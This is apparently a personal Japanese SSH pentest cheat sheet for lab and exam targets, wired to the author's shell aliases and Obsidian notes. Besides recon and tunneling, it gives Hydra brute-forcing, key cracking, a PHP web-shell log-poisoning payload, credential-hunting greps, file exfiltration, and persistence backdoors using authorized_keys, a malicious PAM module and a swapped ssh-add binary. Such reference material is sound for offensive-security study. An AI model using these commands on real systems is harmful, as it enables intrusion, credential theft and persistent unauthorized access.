# SSH ﾁｰﾄｼｰﾄ

## 0. 位置づけ

* 優先度:

  * `nextsvc` ベースでは **SSH は creds / keys / version 確認枠**
  * Web / SMB / AD が強ければそちら優先
  * **資格情報が出た時に一気に価値が上がるサービス** として扱う 

---

## 1. 初動フローに乗せる

```zsh
targettmux 10.10.10.10 targetname
scaninit
ports-init
ports-serv
next
nextsvc
fullcheck
```

* `targettmux` で対象専用セッションを起動
* `scaninit` で Rustscan → fallback → service scan → full scan(bg)
* `ports-serv` と `nextsvc` で SSH が見えたら、ここから手動で深掘り
* 画面証跡は `fshot`
* Obsidian 反映は `ports-note` / `nextsvc-note` / `full-note` / `scan-note`   

---

## 2. SSH の存在確認・列挙

### 2-1. まずは既存スキャン結果で確認

```zsh
ports-serv
nextsvc
```

### 2-2. SSH だけ追加で丁寧に見る

```zsh
nmap -Pn -n -p 22 -sC -sV "$TARGET_IP" -oA "$OUT/nmap_ssh"
```

### 2-3. 公開鍵・ホスト鍵取得

```zsh
ssh-keyscan "$TARGET_IP"
ssh-keyscan -t rsa,ecdsa,ed25519 "$TARGET_IP"
```

### 2-4. NSE の追加確認

```zsh
locate .nse | grep ssh
nmap -Pn -n -p 22 --script "ssh*" "$TARGET_IP" -oA "$OUT/nmap_ssh_nse"
```

### 2-5. ローカル側の確認

```zsh
ss -tulnp | grep ssh
find /home -type f \( -name "id_rsa" -o -name "id_ed25519" \) 2>/dev/null
ls -la ~/.ssh
cat ~/.ssh/authorized_keys 2>/dev/null
grep -Ei 'PermitRootLogin|PasswordAuthentication|PubkeyAuthentication|GatewayPorts' /etc/ssh/sshd_config 2>/dev/null
```

* あなたの運用では成果物は `$OUT` 配下に寄せ、対象単位で `result/` に保存するのが自然です。`$TARGET_IP`, `$OUT`, `$LOG`, `$ASSETS` は `target` / `targettmux` で自動セットされます。 

---

## 3. 認証

### 3-1. 基本接続

```zsh
ssh user@"$TARGET_IP"
ssh -p 22 user@"$TARGET_IP"
```

### 3-2. 秘密鍵指定

```zsh
ssh -i id_rsa user@"$TARGET_IP"
ssh -i id_ed25519 user@"$TARGET_IP"
chmod 600 id_rsa
```

### 3-3. known_hosts を汚さず接続

```zsh
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@"$TARGET_IP"
```

### 3-4. パスワード自動投入

```zsh
sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@"$TARGET_IP"
```

### 3-5. ユーザー名・パスワード候補を自分の環境から使う

```zsh
getlist
cdusers
cdpass
cdcreds
```

* あなたは `$USERS`, `$PASSES`, `$CREDS`, `$SECLISTS`, `getlist` を既に持っているので、SSH ブルートフォース系をやるにしてもその流れに揃えるのが一番速いです。

### 3-6. Hydra

```zsh
hydra -L "$USERS/users-short.txt" -P "$PASSES/default-creds.txt" ssh://"$TARGET_IP"
hydra -l root -P "$ROCKYOU" ssh://"$TARGET_IP"
```

### 3-7. 鍵解析

```zsh
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist="$ROCKYOU"
```

* ここは **許可された lab / exam / 検証環境専用** で使う前提です。あなたの環境は `rockyou` と SecLists を Workbench 側で整理しているので、その資産をそのまま使えます。

### 3-8. Log Poisoning 試行

```zsh
hydra -l '<?php system($_REQUEST["c"]." 2>&1");?>' -p '' ssh://$TARGET_IP
```

---

## 4. SSH 接続後にまず確認すること

```zsh
whoami
id
hostname
uname -a
pwd
ls -la
ip -br -4 a
ss -tulnp
sudo -l
```

### 鍵・履歴・資格情報

```zsh
ls -la ~/.ssh
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts
grep -Rni "pass\|token\|secret" ~ 2>/dev/null
find /home -type f \( -name "*.kdbx" -o -name "*.config" -o -name "*.env" \) 2>/dev/null
```

### 内部到達性

```zsh
ip route
arp -a
ss -tulnp
```

* あなたの全体運用では「侵入後は別サービスへの展開可否を見る」「必要なら pivot に切り替える」流れなので、SSH の次は内部到達性と認証情報再利用の確認が中心になります。

---

## 5. ファイル転送

#### 5-1. SCP

```zsh
scp user@"$TARGET_IP":/etc/passwd .
scp local.txt user@"$TARGET_IP":/tmp/local.txt
scp -i id_rsa user@"$TARGET_IP":/tmp/loot.txt .
```

### 5-2. SSH 経由 tar

```zsh
tar czf - lootdir | ssh user@"$TARGET_IP" 'cat > /tmp/lootdir.tgz'
ssh user@"$TARGET_IP" 'tar czf - /var/www/html' > webroot.tgz
```

### 5-3. あなたの HTTP 転送系を使う

```zsh
# Kali 側
pserv
pserv80
udot
```

### 5-4. 接続確認

```zsh
ss -tulnp | grep 8000
nc -zv "$(vpnip)" 8000
sudo tcpdump -i tun0 port 8000
```

* SSH/SCP で詰まった時も、あなたはすでに `pserv`, `pserv80`, `udot`, `vpnip`, `tcpdump` の確認系を持っているので、そちらへ退避できます。 

---

## 6 . Persistence & Advanced（持続性・高度な手法）

### SSH鍵の作成

```zsh
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""
```

### 公開鍵の登録（バックドア）

```zsh
echo "<pubkey>" >> ~/.ssh/authorized_keys
```

### 権限設定（必須）

```zsh
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```

### **バックドア設置（PAM/バイナリ）

```zsh
sed -i '1i auth required pam_malicious.so' /etc/pam.d/sshd
# 既存バイナリの置換
mv /usr/bin/ssh-add /usr/bin/ssh-add.bak && cp <malicious> /usr/bin/ssh-add
```

### パスワードスニッフィング

```zsh
strace -e trace=read ssh user@host
```

## 7. SSH トンネリング / Pivot

### 7-1. Local Forward

```zsh
ssh -L 8080:127.0.0.1:80 user@"$TARGET_IP"
```

### 7-2. Remote Forward

```zsh
ssh -R 9001:127.0.0.1:9001 user@"$TARGET_IP"
```

### 7-3. Dynamic Forward (SOCKS)

```zsh
ssh -D 1080 user@"$TARGET_IP"
```

### 7-4. Jump Host

```zsh
ssh -J user1@jump1,user2@jump2 user3@finalhost
```

### 7-5. sshuttle

```zsh
sshuttle -r user@"$TARGET_IP" 10.10.0.0/16
```

### 7-6. あなたの infra / pivot 系と併用

```zsh
infratmux
setup_ligolo
chisel_srv
```

* あなたは `infra` セッションを別建てし、VPN / HTTP server / pivot / transfer を分離する設計なので、SSH トンネルは target セッションに閉じ込めず、必要に応じて `infratmux` に逃がすと整理しやすいです。 

---

## 8. AutoRecon / 追加確認との組み合わせ

```zsh
ar
ar_f_nmap
ar_f_nmap_full
arlog
```

```zsh
udp-fast
udp-top
udp-deep
udp-open
```

* SSH しか見えなくても、あなたの設計では `fullcheck` と AutoRecon、必要なら UDP を後追いで回して、見落としを埋める流れが基本です。 

---

## 9. Obsidian に残す最小セット

### 9-1. スキャン結果反映

```zsh
ports-note
nextsvc-note
full-note
```

### 9-2. スクリーンショット

```zsh
fshot
```

### 9-3. 端末ログ反映

```zsh
l2o
l2m
```

### 9-4. SSH 用にメモしておくとよい項目

```text
- username / password / key source
- host key fingerprint
- 接続成功した組み合わせ
- sudo可否
- internal reachable hosts
- 転送に使ったトンネル
- 取得した鍵 / config / history
```

* あなたのテンプレートは `Open Ports`, `Services`, `Next Actions`, `Evidence`, `Background Jobs` を持つので、SSH の結果はこの枠に寄せるのが一番相性がよいです。 

---

## 10. あなた向け最短ルーチン

```zsh
targettmux 10.10.10.10 box
scaninit
ports-serv
nextsvc

# SSH が見えたら
nmap -Pn -n -p 22 -sC -sV "$TARGET_IP" -oA "$OUT/nmap_ssh"
ssh-keyscan "$TARGET_IP"
ssh user@"$TARGET_IP"
# or
ssh -i id_rsa user@"$TARGET_IP"

# 証跡
fshot
nextsvc-note
fullcheck
full-note
```

---

